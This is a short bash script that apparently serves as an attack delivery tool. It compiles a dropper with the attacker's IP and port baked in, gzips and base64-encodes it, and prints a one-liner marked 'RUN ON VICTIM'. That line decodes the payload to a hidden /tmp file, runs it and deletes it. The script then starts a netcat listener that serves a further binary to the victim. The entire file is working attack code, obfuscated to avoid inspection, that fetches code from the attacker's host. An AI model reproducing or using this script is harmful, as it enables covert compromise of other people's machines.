#!/bin/bash

IP=$1
FILE="yourbinary"
PORT=8080


cat dropper.c | sed "s/CH4NG3M3/$IP/g" | sed "s/P0RT/$PORT/g" > tmp.c

make tmp >/dev/null 2>&1

encoded=$(cat tmp | gzip | base64 -w 0)

rm tmp tmp.c

echo "---------------------------------- RUN ON VICTIM -----------------------------------------------------"

echo "echo '$encoded' | base64 -d | gzip -d > /tmp/.f; chmod +x /tmp/.f; /tmp/.f; rm /tmp/.f"
echo "------------------------------------------------------------------------------------------------------"
echo ""
echo "-------------- Starting NC ---------- "
cat $FILE | nc -vv -c -l -p $PORT

